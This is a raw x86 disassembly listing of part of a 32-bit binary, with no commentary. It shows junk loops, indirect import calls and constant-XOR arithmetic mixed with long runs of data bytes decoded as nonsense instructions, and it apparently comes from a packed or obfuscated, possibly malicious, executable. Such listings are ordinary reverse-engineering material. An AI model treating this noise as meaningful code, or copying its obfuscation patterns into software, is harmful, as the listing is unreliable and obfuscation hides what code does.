  4082fe:	mov    ds:0x9e47ce77,eax
  408303:	fisttp DWORD PTR [ebx-0x1699f406]
  408309:	repz ss cmc 
  40830c:	ss cmp al,0xa3
  40830f:	dec    esp
  408310:	(bad)  
  408311:	inc    eax
  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
  40832b:	and    DWORD PTR ds:0x4233db,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4233db
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4233db,ecx
  408347:	cmp    DWORD PTR ds:0x4233db,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4233db,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4233db,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4233db
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4233db,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412300
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417d25,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417d25
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417d25,eax
  4083b1:	cmp    DWORD PTR ds:0x417d25,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417d25,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4233db,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415031,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [edx+ebx*4+0x61574363],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x40840f
  40840c:	jmp    0xc621:0xbf09e9b8
  408413:	nop
  408414:	mov    bh,0x65
  408416:	inc    esi
  408417:	in     al,0xb
  408419:	aad    0xe4
  40841b:	les    esi,FWORD PTR [eax-0x1b]
  40841e:	je     0x408417
  408420:	pop    ebx
  408421:	outs   dx,BYTE PTR ds:[esi]
  408422:	mov    ds:0x9bcf0433,eax
  408427:	rol    DWORD PTR ds:0x6a00de08,1
  40842d:	mov    ebx,0xfd95c9a1
  408432:	sbb    BYTE PTR [edi],ah
  408434:	das    
  408435:	fisttp DWORD PTR [edi]
  408437:	adc    esp,DWORD PTR [ecx-0xb]
  40843a:	sbb    al,BYTE PTR ds:0xbfca93dc
  408440:	les    edi,FWORD PTR [eax]
  408442:	ror    BYTE PTR [esi+0x2c8c82ec],cl
  408448:	mov    eax,ds:0x64e19652
  40844d:	shr    BYTE PTR [ecx],1
  40844f:	or     bh,BYTE PTR [edx]
  408451:	sub    DWORD PTR [edx],0x6b
  408454:	dec    esp
  408455:	mul    DWORD PTR [esi]
  408457:	jl     0x4083f2
  408459:	imul   esp,DWORD PTR [ebx+edi*4],0x635d75d9
  408460:	nop
  408461:	test   BYTE PTR [ebx+0x159150db],dl
  408467:	mov    al,al
  408469:	inc    edi
  40846a:	xchg   ebx,eax
  40846b:	adc    al,0xec
  40846d:	push   ecx
  40846e:	cmp    al,BYTE PTR gs:[ebp+eiz*1-0x404890f7]
  408476:	ret    
  408477:	add    DWORD PTR [ebp-0x1b],edi
  40847a:	jge    0x40840b
  40847c:	xor    cl,0x63
  40847f:	inc    eax
  408480:	in     eax,dx
  408481:	fld    TBYTE PTR [edx]
  408483:	push   cs
  408484:	xchg   esi,eax
  408485:	cld    
  408486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408487:	jg     0x40849e
  408489:	mov    ds:0xc7007f83,eax
  40848e:	inc    esi
  40848f:	in     eax,dx
  408490:	xor    al,0x93
  408492:	imul   esi,DWORD PTR [ecx-0x3593385c],0x7b75d193
  40849c:	xchg   ebx,eax
  40849d:	ins    DWORD PTR es:[edi],dx
  40849e:	pushf  
  40849f:	pusha  
  4084a0:	lahf   
  4084a1:	push   ebx
  4084a2:	cli    
  4084a3:	cdq    
  4084a4:	sub    eax,0xbda717a
  4084a9:	lods   al,BYTE PTR ds:[esi]
  4084aa:	fsub   QWORD PTR [ebx-0x73e86ff5]
  4084b0:	adc    BYTE PTR [eax],dl
  4084b2:	rcr    BYTE PTR [ebp+0x341aa56e],1
  4084b8:	sub    eax,0x30aa7bdc
  4084bd:	add    ebp,esi
  4084bf:	inc    eax
  4084c0:	jmp    0x14b59a7c
  4084c5:	and    dh,BYTE PTR es:[ecx+0x2c406426]
  4084cc:	iret   
  4084cd:	stos   DWORD PTR es:[edi],eax
  4084ce:	jl     0x40849c
  4084d0:	retf   
  4084d1:	cmc    
  4084d2:	cmp    edx,ecx
  4084d4:	scas   eax,DWORD PTR es:[edi]
  4084d5:	pop    ss
  4084d6:	mov    ah,0x8a
  4084d8:	sbb    al,0x2d
  4084da:	test   eax,0x69860ca0
  4084df:	push   edi
  4084e0:	jmp    0x821b:0x9669e077
  4084e7:	cmp    DWORD PTR [eax+0x14],0xfffffff8
  4084eb:	rcr    edi,0x37
  4084ee:	mov    ebp,0xad0d2a1e
  4084f3:	into   
  4084f4:	dec    eax
  4084f5:	mov    ah,0x23
  4084f7:	outs   dx,DWORD PTR ds:[esi]
  4084f8:	enter  0x5ea2,0x27
  4084fc:	pop    ebp
  4084fd:	or     eax,0xc7d9e5ca
  408502:	jl     0x4084f2
  408504:	nop
  408505:	cmp    al,0xc6
  408507:	inc    eax
  408508:	inc    ecx
  408509:	mov    edx,0xa2476f21
  40850e:	cli    
  40850f:	xor    eax,0xed9e767b
  408514:	ja     0x4084c9
  408516:	mov    bl,0x66
  408518:	xor    eax,DWORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41aa3e
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417d19
  40852f:	or     ecx,DWORD PTR ds:0x412304
  408535:	mov    DWORD PTR ds:0x417d19,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0x2026a896
  40854d:	and    al,0x94
  40854f:	xor    eax,0x7e7e2a7d
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4084f7
  408559:	push   edx
  40855a:	enter  0x9f67,0x5e
  40855e:	cwde   
  40855f:	scas   eax,DWORD PTR es:[edi]
  408560:	mov    ds:0x677aa46c,al
  408565:	lods   eax,DWORD PTR ds:[esi]
  408566:	fwait
  408567:	call   0x6fdc0c89
  40856c:	addr16 push 0xffffffa8
  40856f:	int    0xe5
  408571:	fistp  QWORD PTR [esi]
  408573:	jp     0x408501
  408575:	in     al,dx
  408576:	retf   0x926a
  408579:	in     al,dx
  40857a:	(bad)  
  40857c:	cmp    DWORD PTR [edi-0x196641d6],0x79777e17
  408586:	mov    edx,0xdfdfe852
  40858b:	test   al,ah
  40858d:	stos   BYTE PTR es:[edi],al
  40858e:	add    BYTE PTR [edi+0x12],0xec
  408592:	jae    0x408582
  408594:	mov    ds:0x269e4faf,al
  408599:	sti    
  40859a:	jle    0x408612
  40859c:	push   cs
  40859d:	or     edi,DWORD PTR [esi+0x592904db]
  4085a3:	(bad)  
  4085a4:	shl    cl,1
  4085a6:	xor    al,0x78
  4085a8:	xor    al,0x15
  4085aa:	leave  
  4085ab:	test   DWORD PTR [ebx+esi*1+0x47],edi
  4085af:	ds in  eax,0x32
  4085b2:	sbb    ebx,DWORD PTR [ecx+esi*2+0x3f]
  4085b6:	popa   
  4085b7:	and    DWORD PTR [esi+0x5af17426],ebx
  4085bd:	xchg   edi,eax
  4085be:	pop    ax
  4085c0:	and    DWORD PTR [edx+0x57426f68],edi
  4085c6:	out    0xc6,al
  4085c8:	test   ch,ah
  4085ca:	jb     0x408615
  4085cc:	add    BYTE PTR [edi],ah
  4085ce:	icebp  
  4085cf:	cwde   
  4085d0:	popa   
  4085d1:	lea    ebp,[eax-0x49b32aa]
  4085d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d8:	ja     0x4085e6
  4085da:	push   ss
  4085db:	push   ebx
  4085dc:	mov    eax,ds:0x2b0779b9
  4085e1:	jnp    0x408564
  4085e3:	adc    DWORD PTR [eax+ecx*8-0x22],ebp
  4085e7:	xchg   esi,eax
  4085e8:	es dec esi
  4085ea:	shl    edi,cl
  4085ec:	rcr    BYTE PTR [ebx+0x60589e0f],cl
  4085f2:	adc    ebp,DWORD PTR [eax+eiz*8]
  4085f5:	ret    
  4085f6:	aaa    
  4085f7:	pop    ecx
  4085f8:	ja     0x4085ff
  4085fa:	(bad)  
  4085fb:	push   0x751612ef
  408600:	mov    al,0x31
  408602:	ins    BYTE PTR es:[edi],dx
  408603:	or     BYTE PTR [eax+0x6cd53954],ah
  408609:	push   ss
  40860a:	arpl   WORD PTR [ebx],bx
  40860c:	sbb    BYTE PTR [eax],0x68
  40860f:	repz push ss
  408611:	outs   dx,BYTE PTR ds:[esi]
  408612:	dec    esp
  408613:	inc    ecx
  408614:	add    ch,ch
  408616:	push   edx
  408617:	rcr    BYTE PTR [ebp-0x54c21707],cl
  40861d:	add    esp,ecx
  40861f:	push   edi
  408620:	pop    ebp
  408621:	cdq    
  408622:	ins    BYTE PTR es:[edi],dx
  408623:	jno    0x40866b
  408625:	das    
  408626:	xchg   esp,eax
  408627:	xlat   BYTE PTR ds:[ebx]
  408628:	xor    bl,BYTE PTR [edx-0x1d40bda0]
  40862e:	mov    ds:0x77735f92,eax
  408633:	add    DWORD PTR [esi-0x44d1a950],0x5c6d7a67
  40863d:	repz jno 0x40861b
  408640:	call   0x8c2c:0x374d5272
  408647:	fst    DWORD PTR [eax]
  408649:	inc    esi
  40864a:	pop    es
  40864b:	jge    0x40861d
  40864d:	xchg   ebx,eax
  40864e:	cwde   
  40864f:	mov    ds:0xf7578b49,al
  408654:	xchg   ecx,eax
  408655:	cmp    BYTE PTR [ecx],bh
  408657:	and    ah,BYTE PTR [ebx]
  408659:	fwait
  40865a:	dec    ecx
  40865b:	stos   DWORD PTR es:[edi],eax
  40865c:	mov    cl,0x2d
  40865e:	inc    ecx
  40865f:	pusha  
  408660:	rcr    BYTE PTR [edx-0x3d],0x4a
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417d19
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4233d7,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41503d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41503d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41503d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41503d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41503d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x41502d,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x41502d
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x41502d,ecx
  4086d9:	cmp    DWORD PTR ds:0x41502d,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41abf7
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x41502d,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x41502d
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x41502d,ecx
  40870b:	cmp    DWORD PTR ds:0x41502d,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41aa52,0x415035
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fisub  DWORD PTR [ebx]
  408741:	rol    DWORD PTR [eax-0x74],cl
  408744:	or     DWORD PTR [ebx],ebp
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x408773
  40874d:	cmp    al,0x28
  40874f:	outs   dx,DWORD PTR ds:[esi]
  408750:	mov    ecx,ebp
  408752:	lock js 0x40879e
  408755:	push   edi
  408756:	sub    bh,bh
  408758:	(bad)  
  408759:	imul   eax,DWORD PTR [ebp+0x18],0xa393ac76
  408760:	or     BYTE PTR [ebx],0x81
  408763:	jp     0x408712
  408765:	inc    esi
  408766:	stc    
  408767:	inc    edx
  408768:	fild   DWORD PTR [eax]
  40876a:	pop    edi
  40876b:	shl    ebp,cl
  40876d:	not    dh
  40876f:	scas   al,BYTE PTR es:[edi]
  408770:	out    0x9d,al
  408772:	adc    edi,DWORD PTR [edx]
  408774:	lea    esp,[eax]
  408776:	or     DWORD PTR [edi+0x7e6ffd17],edi
  40877c:	push   ebx
  40877d:	and    DWORD PTR [edi],0xffffffe1
  408780:	xor    ch,BYTE PTR [esi*8-0x638a2b3]
  408787:	(bad)  
  408789:	mov    ch,0x37
  40878b:	xchg   ecx,eax
  40878c:	or     edx,DWORD PTR [edi]
  40878e:	std    
  40878f:	jb     0x40872b
  408791:	nop
  408792:	fild   QWORD PTR [edi]
  408794:	inc    esp
  408795:	and    edi,DWORD PTR [ecx]
  408797:	dec    edx
  408798:	xor    al,0x62
  40879a:	inc    esp
  40879b:	jg     0x40880e
  40879d:	enter  0xc9af,0x8d
  4087a1:	xchg   edx,eax
  4087a2:	dec    edx
  4087a3:	dec    eax
  4087a4:	ss (bad) 
  4087a6:	jb     0x4087ee
  4087a8:	imul   esp,DWORD PTR [eax+eax*4+0x48],0xffffff95
  4087ad:	xchg   esp,eax
  4087ae:	mov    eax,ds:0xeac02286
  4087b3:	out    dx,eax
  4087b4:	inc    edx
  4087b5:	jecxz  0x40877c
  4087b7:	std    
  4087b8:	cwde   
  4087b9:	(bad)  
  4087ba:	mov    ds:0xe8434568,al
  4087bf:	xor    DWORD PTR [ebx-0x514d0e1b],ebx
  4087c5:	pop    esp
  4087c6:	in     eax,dx
  4087c7:	add    BYTE PTR [esi],bl
  4087c9:	sbb    ebx,esi
  4087cb:	and    DWORD PTR [esi-0x3c],esi
  4087ce:	mov    ds:0xce211d73,eax
  4087d3:	in     eax,0xc9
  4087d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d6:	cmp    esi,DWORD PTR [eax+0x27]
  4087d9:	data16 jecxz 0x408856
  4087dc:	add    eax,0xa2306341
  4087e1:	out    0x50,eax
  4087e3:	jle    0x40879e
  4087e5:	push   esi
  4087e6:	mov    ds:0x2581a55b,eax
  4087eb:	dec    ebp
  4087ec:	push   ds
  4087ed:	imul   eax,DWORD PTR [ebp-0x789dfafc],0xc7cef8c3
  4087f7:	hlt    
  4087f8:	mov    ecx,0x975cdaa2
  4087fd:	mov    ch,0xbb
  4087ff:	mov    eax,ds:0xd6d5a4e7
  408804:	ins    DWORD PTR es:[edi],dx
  408805:	ins    DWORD PTR es:[edi],dx
  408806:	mov    ds:0x7878c604,al
  40880b:	jno    0x4087f4
  40880d:	sbb    DWORD PTR [edx-0x2a],ebx
  408810:	adc    esi,DWORD PTR [ebx]
  408812:	out    dx,al
  408813:	add    ebx,ebp
  408815:	push   ds
  408816:	push   DWORD PTR ds:0x9f1ec6a7
  40881c:	outs   dx,BYTE PTR ds:[esi]
  40881d:	sar    ebx,0x3a
  408820:	mov    ebx,0xc33734ba
  408825:	div    DWORD PTR [ecx-0x46]
  408828:	jmp    0xf7b3db7
  40882d:	adc    DWORD PTR [edx],0x5ee97243
  408833:	daa    
  408834:	xor    WORD PTR [ebp-0x17b567bc],cx
  40883b:	std    
  40883c:	out    0x36,eax
  40883e:	and    al,0x51
  408840:	jae    0x408827
  408842:	fcomip st,st(7)
  408844:	xor    al,dh
  408846:	into   
  408847:	jge    0x40883c
  408849:	imul   BYTE PTR [ebx-0x56]
  40884c:	cmp    eax,DWORD PTR [ebx]
  40884e:	cmp    eax,0x7aedc590
  408853:	inc    ecx
  408854:	sub    edx,DWORD PTR [edx-0x4b]
  408857:	jno    0x408820
  408859:	inc    ebp
  40885a:	clc    
  40885b:	cmp    BYTE PTR [ebp+0x1581f89c],al
  408861:	add    BYTE PTR [ebx],ah
  408863:	inc    ecx
  408864:	add    BYTE PTR [esi-0x38ffffe9],al
  40886a:	inc    ebp
  40886b:	lock cmp eax,DWORD PTR [ebp+0x458bf89c]
  408872:	clc    
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417d29
  40887b:	sbb    DWORD PTR ds:0x41aa4e,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41aa56,0x417d21
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417d29,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417d29
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417d29,esi
  4088a8:	cmp    DWORD PTR ds:0x417d29,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ab76
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417d29,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417d29
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417d29,esi
  40890d:	cmp    DWORD PTR ds:0x417d29,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0x54d74167],edx
  408951:	sbb    BYTE PTR [ecx+0x7e280577],al
  408957:	jle    0x408963
  408959:	jg     0x4089d9
  40895b:	jle    0x408902
  40895d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40895e:	sub    al,BYTE PTR [ecx-0x4f]
  408961:	int    0x1c
  408963:	test   bl,bl
  408965:	fcomip st,st(5)
  408967:	sbb    eax,0x6a029c9b
  40896c:	inc    edi
  40896d:	das    
  40896e:	stc    
  40896f:	inc    esi
  408970:	adc    eax,0xe9022f6e
  408975:	lds    edi,FWORD PTR [edx+0x31]
  408978:	arpl   bp,di
  40897a:	test   al,0x13
  40897c:	sub    eax,0x291ae230
  408981:	fild   QWORD PTR ds:0xbdd97cd3
  408987:	cwde   
  408988:	push   cs
  408989:	pop    edx
  40898a:	sbb    bh,BYTE PTR [ecx+0x7e]
  40898d:	adc    DWORD PTR [ebp+0x75c482bf],0x476947e7
  408997:	or     eax,edi
  408999:	ins    BYTE PTR es:[edi],dx
  40899a:	xor    al,0x3d
  40899c:	xor    bl,ah
  40899e:	push   esp
  40899f:	sbb    dl,BYTE PTR [eax+0x6bd48898]
  4089a5:	loop   0x408991
  4089a7:	mov    ds:0xfad7504,eax
  4089ac:	xchg   BYTE PTR [eax+0x462b7fe2],dh
  4089b2:	dec    ebp
  4089b3:	and    edi,DWORD PTR [ecx]
  4089b5:	(bad)  
  4089b6:	xchg   edi,eax
  4089b7:	jae    0x408952
  4089b9:	xor    BYTE PTR [ebx],al
  4089bb:	or     ebx,0x7e8583b7
  4089c1:	jmp    0xc3520899
  4089c6:	(bad)  
  4089c7:	in     al,0xe
  4089c9:	dec    edx
  4089ca:	int3   
  4089cb:	out    0x5f,eax
  4089cd:	or     bl,BYTE PTR [eax-0x56]
  4089d0:	push   esi
  4089d1:	or     dh,BYTE PTR [edi+0x606dae99]
  4089d7:	enter  0xf462,0x8d
  4089db:	dec    ebx
  4089dc:	nop
  4089dd:	dec    ebp
  4089de:	xchg   esi,eax
  4089df:	aam    0x40
  4089e1:	inc    eax
  4089e2:	mov    edi,0xabe170be
  4089e7:	jbe    0x4089e8
  4089e9:	push   ss
  4089ea:	jno    0x408a06
  4089ec:	stos   DWORD PTR es:[edi],eax
  4089ed:	mov    ds:0x39497598,al
  4089f2:	mov    eax,0x7c0d0cfb
  4089f7:	inc    eax
  4089f8:	dec    ecx
  4089f9:	scas   al,BYTE PTR es:[edi]
  4089fa:	retf   0xa530
  4089fd:	call   0x35f68e11
  408a02:	dec    ebp
  408a03:	ds cmp al,0xda
  408a06:	or     DWORD PTR ss:[ebx-0x1897f0b1],edi
  408a0d:	dec    edx
  408a0e:	cli    
  408a0f:	cmc    
  408a10:	pop    ecx
  408a11:	enter  0x12fd,0x98
  408a15:	or     DWORD PTR [edx+edx*2-0x39],0xe67b0539
  408a1d:	mov    DWORD PTR [edi+0x4c],edi
  408a20:	fmulp  st(1),st
  408a22:	stos   BYTE PTR es:[edi],al
  408a23:	cwde   
  408a24:	xor    edx,0x422357c2
  408a2a:	push   esi
  408a2b:	xchg   ebp,eax
  408a2c:	push   es
  408a2d:	(bad)  
  408a2e:	pop    ebp
  408a2f:	fcomp  QWORD PTR [eax]
  408a31:	int3   
  408a32:	fld    QWORD PTR [ebx*4+0x318e37b3]
  408a39:	cmp    BYTE PTR [ecx+0x77],bh
  408a3c:	clc    
  408a3d:	and    esp,DWORD PTR [ebx+edx*4-0x6778b8c]
  408a44:	hlt    
  408a45:	xchg   ebx,eax
  408a46:	mov    dh,0x8b
  408a48:	mov    ebp,DWORD PTR [ebx+0x55529bc9]
  408a4e:	je     0x408aa8
  408a50:	sbb    al,0x4f
  408a52:	repnz es pop ebx
  408a55:	pushf  
  408a56:	test   al,0x1a
  408a58:	jae    0x408a4b
  408a5a:	jmp    0x1da0:0xc764358b
  408a61:	push   DWORD PTR [ebx-0x1a4c8eb8]
  408a67:	hlt    
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	nop
  408a86:	push   0x1d
  408a88:	inc    ebx
  408a89:	adc    DWORD PTR [ecx],ebp
  408a8b:	jle    0x408b0b
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408a53
  408a92:	(bad)  
  408a94:	cmc    
  408a95:	iret   
  408a96:	add    BYTE PTR [edi-0x4b0a1a09],ah
  408a9c:	enter  0xfc3c,0x98
  408aa0:	cdq    
  408aa1:	hlt    
  408aa2:	cli    
  408aa3:	or     cl,ah
  408aa5:	cmp    dl,dh
  408aa7:	jb     0x408ad3
  408aa9:	fisttp QWORD PTR [eax+0x76f1cce9]
  408aaf:	lods   al,BYTE PTR ds:[esi]
  408ab0:	scas   al,BYTE PTR es:[edi]
  408ab1:	ins    BYTE PTR es:[edi],dx
  408ab2:	out    dx,al
  408ab3:	xor    BYTE PTR [ebx+ecx*2-0x2df68888],ah
  408aba:	sbb    eax,ebx
  408abc:	dec    ebp
  408abd:	es in  eax,0x42
  408ac0:	sahf   
  408ac1:	lea    ebx,[ecx+0x0]
  408ac4:	or     DWORD PTR [esi+0x44],eax
  408ac7:	scas   eax,DWORD PTR es:[edi]
  408ac8:	cmp    dh,BYTE PTR [edx+0x2f1fc80b]
  408ace:	(bad)  
  408acf:	mov    eax,ds:0xc40ac367
  408ad4:	xor    esp,DWORD PTR [esp+esi*1]
  408ad7:	mov    ch,0x97
  408ad9:	and    BYTE PTR [ecx+esi*1+0x1ca9d776],bl
  408ae0:	fmulp  st(1),st
  408ae2:	aad    0x29
  408ae4:	lock mov eax,0xa09efc7f
  408aea:	outs   dx,DWORD PTR ds:[esi]
  408aeb:	mov    al,ds:0x16bc5f36
  408af0:	test   al,0xee
  408af2:	pop    eax
  408af3:	and    bh,BYTE PTR [ecx]
  408af5:	pop    es
  408af6:	aaa    
  408af7:	loop   0x408b3f
  408af9:	lds    edx,FWORD PTR [ebp+0x4333cecf]
  408aff:	popa   
  408b00:	loopne 0x408b6b
  408b02:	adc    cl,BYTE PTR [ecx+0x30fb59db]
  408b08:	sub    ebp,DWORD PTR [ebx+0x2fd123e6]
  408b0e:	jecxz  0x408aa1
  408b10:	pop    es
  408b11:	mov    ecx,ecx
  408b13:	adc    edx,ebx
  408b15:	fstp   QWORD PTR [ebx+esi*8-0x15]
  408b19:	retf   0x2897
  408b1c:	sbb    eax,0xaa9f56ad
  408b21:	shr    BYTE PTR [ebx+0x70],1
  408b24:	test   eax,0xdccab0a0
  408b29:	sbb    al,0x8e
  408b2b:	repz cli 
  408b2d:	arpl   WORD PTR [edi+0x6d],bp
  408b30:	mov    bh,0x3a
  408b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b33:	(bad)  
  408b35:	fbld   TBYTE PTR [edx]
  408b37:	shl    DWORD PTR [esi-0x4cd9cad5],1
  408b3d:	iret   
  408b3e:	mov    eax,ds:0x89a678bb
  408b43:	sub    ebp,DWORD PTR [ecx-0x7f1321d]
  408b49:	arpl   WORD PTR [esi],dx
  408b4b:	loopne 0x408b21
  408b4d:	mov    bl,0x5f
  408b4f:	mov    esp,0x391cd77e
  408b54:	inc    ebp
  408b55:	cmc    
  408b56:	enter  0xec64,0x1
  408b5a:	jnp    0x408b8e
  408b5c:	into   
  408b5d:	out    0x13,al
  408b5f:	shl    esi,1
  408b61:	xor    ebx,DWORD PTR [esi]
  408b63:	xor    bl,al
  408b65:	ror    eax,0x6c
  408b68:	ja     0x408b61
  408b6a:	add    bh,BYTE PTR [edx+0x49f6dcd5]
  408b70:	test   BYTE PTR [ecx+0x2f2a8751],bh
  408b76:	pop    ds
  408b77:	jne    0x408b8f
  408b79:	aam    0x2a
  408b7b:	pusha  
  408b7c:	mov    ebp,es
  408b7e:	sbb    al,0xd
  408b80:	ror    DWORD PTR [edx+0x19],cl
  408b83:	sub    eax,ebx
  408b85:	lods   eax,DWORD PTR es:[esi]
  408b87:	fcmovne st,st(6)
  408b89:	int3   
  408b8a:	xor    al,BYTE PTR [edx+ebp*4-0x25502b0c]
  408b91:	jp     0x408b4a
  408b93:	inc    edi
  408b94:	shr    al,1
  408b96:	push   ss
  408b97:	arpl   WORD PTR [edx-0x55a934ff],bp
  408b9d:	push   ebx
  408b9e:	push   edi
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx+0x441369bd]
  408bcf:	sub    DWORD PTR [esi+0x44],edx
  408bd2:	sub    eax,0xa7e7e2e
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408b75
  408bdb:	sbb    esp,DWORD PTR [esi-0x1b]
  408bde:	test   bh,bl
  408be0:	dec    edi
  408be1:	or     DWORD PTR [ebx-0x12],0xc9edb892
  408be8:	xchg   ebp,eax
  408be9:	mov    bl,0xf1
  408beb:	(bad)  
  408bec:	xlat   BYTE PTR ds:[ebx]
  408bed:	xchg   DWORD PTR [edx],ebp
  408bef:	cmp    BYTE PTR ds:[esi],ah
  408bf2:	loop   0x408bc2
  408bf4:	data16 arpl WORD PTR [esi-0x80],sp
  408bf8:	lds    edi,FWORD PTR [ecx-0x62]
  408bfb:	pop    eax
  408bfc:	adc    edx,esi
